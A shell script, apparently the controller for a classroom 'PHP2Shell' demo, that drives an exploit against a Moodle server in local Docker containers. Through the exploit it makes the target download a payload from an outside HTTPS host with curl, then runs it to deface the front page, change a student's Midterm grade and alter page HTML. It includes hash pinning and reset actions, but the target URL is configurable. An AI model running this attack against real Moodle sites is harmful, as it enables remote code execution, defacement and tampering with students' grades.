#!/bin/sh
# Controller for the PHP2Shell Moodle instructor demo.
#
# `setup` is the only action that delivers the payload with a long command.
# All visible effects use only `php /tmp/p <code>` (at most 14 bytes), sent
# through the PoC. This script uses HTTP and the PoC only: never loot/ or
# docker exec.
set -u

ROOT=$(CDPATH= cd -- "$(dirname -- "$0")/.." && pwd)
cd "$ROOT" || exit 1

if [ -f .env ]; then
    set -a
    . ./.env
    set +a
fi

PORT=${MOODLE_PORT:-8080}
URL=${DEMO_PAYLOAD_URL:-https://s.xn--kst.tw/A}
MOODLE_URL=${DEMO_MOODLE_URL:-http://127.0.0.1:${PORT}/index.php}
COMPOSE="docker compose -f compose.yaml -f compose.vuln.yaml"
LOCAL_PAYLOAD=labs/examples/moodle-payload.php
PLANNER=scripts/short_command_planner.py
PROOF_URL=${MOODLE_URL%/index.php}/demo-proof.txt
DRY=0

usage() {
    cat <<'EOF'
Usage: sh scripts/instructor-demo.sh [--dry-run] <action> [grade]

Run `setup` once after starting Moodle. It downloads the instructor payload
through the PoC. Each later effect sends only short commands through the PoC.

Actions:
  setup               install the payload, then clear the HTTP proof
  homepage            set the front-page name to PWNED by PHP2Shell
  reset-homepage      restore the previous front-page name
  grade <integer>     set the Midterm grade (0 through 1295)
  good-hacker         add the clickable good-hacker image
  reset-good-hacker   remove the image and restore the page HTML

Configuration:
  DEMO_PAYLOAD_URL     HTTPS URL serving labs/examples/moodle-payload.php
  DEMO_PAYLOAD_SHA256  optional SHA-256 pin; default is the local payload hash
  DEMO_MOODLE_URL      optional target URL; default http://127.0.0.1:MOODLE_PORT/index.php
EOF
}

log() { printf '%s\n' "$*"; }
fail() { printf 'FAIL: %s\n' "$*" >&2; exit 1; }

sha256_file() {
    python3 - "$1" <<'PY'
import hashlib
import sys
h = hashlib.sha256()
with open(sys.argv[1], "rb") as handle:
    for chunk in iter(lambda: handle.read(1024 * 1024), b""):
        h.update(chunk)
print(h.hexdigest())
PY
}

preflight() {
    command -v python3 >/dev/null 2>&1 || fail "python3 is required"
    CONTAINER=$($COMPOSE ps -q moodle 2>/dev/null || true)
    [ -n "$CONTAINER" ] || fail "Moodle container is not running"
    CODE=$(curl --silent --output /dev/null --write-out '%{http_code}' --max-time 10 "$MOODLE_URL" 2>/dev/null || true)
    [ "$CODE" = "200" ] || fail "Moodle front page is not ready (HTTP ${CODE:-none})"
    log "preflight=ok url=$MOODLE_URL"
}

download_payload() {
    [ -n "$URL" ] || fail "DEMO_PAYLOAD_URL is not configured"
    [ -f "$LOCAL_PAYLOAD" ] || fail "local reviewed payload is missing: $LOCAL_PAYLOAD"
    EXPECTED_SHA=${DEMO_PAYLOAD_SHA256:-$(sha256_file "$LOCAL_PAYLOAD")}
    case "$URL" in https://*) ;; *) fail "DEMO_PAYLOAD_URL must be HTTPS (got: $URL)" ;; esac
    case "$URL" in *\'*) fail "DEMO_PAYLOAD_URL must not contain a single quote" ;; esac
    TMP=$(mktemp "${TMPDIR:-/tmp}/p2s-payload.XXXXXX")
    if ! curl --fail --location --silent --show-error --max-time 30 "$URL" -o "$TMP"; then
        rm -f "$TMP"
        fail "payload download failed: $URL"
    fi
    ACTUAL=$(sha256_file "$TMP")
    rm -f "$TMP"
    [ "$ACTUAL" = "$EXPECTED_SHA" ] || fail "payload SHA-256 mismatch: expected $EXPECTED_SHA, got $ACTUAL"
    log "payload=verified sha256=$EXPECTED_SHA"
}

# exploit.py reads the local image's libphp symbols to derive its offsets.
# It never uses Docker to execute a demo action; every action is sent over HTTP.
run_short() {
    command=$1
    fetch=$2
    python3 php2shell/exploit.py \
        -u "$MOODLE_URL" \
        --profile official83 \
        --docker-container "$CONTAINER" \
        --proof-file '' \
        --fetch "$fetch" \
        -c "$command" >/dev/null 2>&1
}

run_plan() {
    command=$1
    PLAN=$(python3 "$PLANNER" "$command") || fail "cannot plan payload download"
    COUNT=$(printf '%s\n' "$PLAN" | wc -l | tr -d ' ')
    log "payload-install=run steps=$COUNT"
    printf '%s\n' "$PLAN" | while IFS= read -r step; do
        log "payload-install-step=$step"
        run_short "$step" /index.php || {
            log "payload-install-step=failed command=$step"
            exit 1
        }
    done || fail "a payload-install command failed"
}

clear_proof() {
    # Code 0 removes the proof. Fetching /index.php only tells the PoC when
    # its request completed; the following HTTP request verifies the removal.
    run_short 'php /tmp/p 0' /index.php || fail "proof-clear PoC failed"
    if curl --fail --silent --show-error --max-time 10 "$PROOF_URL" >/dev/null 2>&1; then
        fail "proof-clear did not remove the previous HTTP proof"
    fi
}

read_proof() {
    curl --fail --silent --show-error --max-time 10 "$PROOF_URL" || fail "target produced no HTTP proof"
}

setup() {
    download_payload
    run_plan "curl -fsSL '${URL}' -o /tmp/p"
    clear_proof
    log "setup=ok payload=/tmp/p proof=cleared"
}

run_action() {
    code=$1
    expected=$2
    # This is short and makes each action's HTTP proof fresh. It does not
    # repeat the long payload-delivery plan from `setup`.
    clear_proof
    run_short "php /tmp/p $code" /demo-proof.txt || fail "action PoC failed; run setup after starting Moodle"
    PROOF_TEXT=$(read_proof)
    case "$PROOF_TEXT" in
        *demo=failed*) fail "payload reported failure: $PROOF_TEXT" ;;
        *"$expected"*) ;;
        *) fail "HTTP proof does not contain $expected: $PROOF_TEXT" ;;
    esac
    log "$PROOF_TEXT"
}

grade_code() {
    python3 -c '
import sys
n = int(sys.argv[1])
if not 0 <= n <= 1295:
    raise SystemExit("grade must be an integer from 0 through 1295")
digits = "0123456789abcdefghijklmnopqrstuvwxyz"
encoded = digits[n // 36] + digits[n % 36] if n >= 36 else digits[n]
print("g" + encoded)
' "$1"
}

ACTION_NAME=''
ACTION_CODE=''
EXPECTED_PROOF=''
while [ "$#" -gt 0 ]; do
    case "$1" in
        --help|-h) usage; exit 0 ;;
        --dry-run) DRY=1; shift; continue ;;
        setup) [ -z "$ACTION_NAME" ] || fail "only one action can be run at a time"; ACTION_NAME=setup; shift ;;
        homepage) [ -z "$ACTION_NAME" ] || fail "only one action can be run at a time"; ACTION_NAME=homepage; ACTION_CODE=1; EXPECTED_PROOF='homepage=ok'; shift ;;
        reset-homepage) [ -z "$ACTION_NAME" ] || fail "only one action can be run at a time"; ACTION_NAME=reset-homepage; ACTION_CODE=2; EXPECTED_PROOF='homepage-reset=ok'; shift ;;
        good-hacker) [ -z "$ACTION_NAME" ] || fail "only one action can be run at a time"; ACTION_NAME=good-hacker; ACTION_CODE=5; EXPECTED_PROOF='good-hacker=ok'; shift ;;
        reset-good-hacker) [ -z "$ACTION_NAME" ] || fail "only one action can be run at a time"; ACTION_NAME=reset-good-hacker; ACTION_CODE=6; EXPECTED_PROOF='good-hacker-reset=ok'; shift ;;
        grade)
            [ -z "$ACTION_NAME" ] || fail "only one action can be run at a time"
            shift
            [ "$#" -gt 0 ] || fail "grade needs an integer"
            case "$1" in *[!0-9]*|'') fail "grade must be an integer from 0 through 1295" ;; esac
            ACTION_NAME="grade $1"
            ACTION_CODE=$(grade_code "$1") || fail "grade must be an integer from 0 through 1295"
            EXPECTED_PROOF='grade=ok'
            shift ;;
        *) fail "unknown argument: $1" ;;
    esac
done

[ -n "$ACTION_NAME" ] || { usage; exit 2; }

if [ "$DRY" -eq 1 ]; then
    LOCAL_SHA=$(sha256_file "$LOCAL_PAYLOAD" 2>/dev/null || true)
    printf 'action: %s\n' "$ACTION_NAME"
    printf 'payload URL: %s\n' "$URL"
    printf 'payload SHA-256: %s\n' "${DEMO_PAYLOAD_SHA256:-${LOCAL_SHA:-<local payload missing>}}"
    if [ "$ACTION_NAME" = setup ]; then
        printf 'target setup: planned <=14-byte payload download, then php /tmp/p 0\n'
    else
        printf 'target action: php /tmp/p 0, then php /tmp/p %s\n' "$ACTION_CODE"
    fi
    printf 'HTTP proof: %s\n' "$PROOF_URL"
    exit 0
fi

preflight

if [ "$ACTION_NAME" = setup ]; then
    setup
else
    run_action "$ACTION_CODE" "$EXPECTED_PROOF"
fi
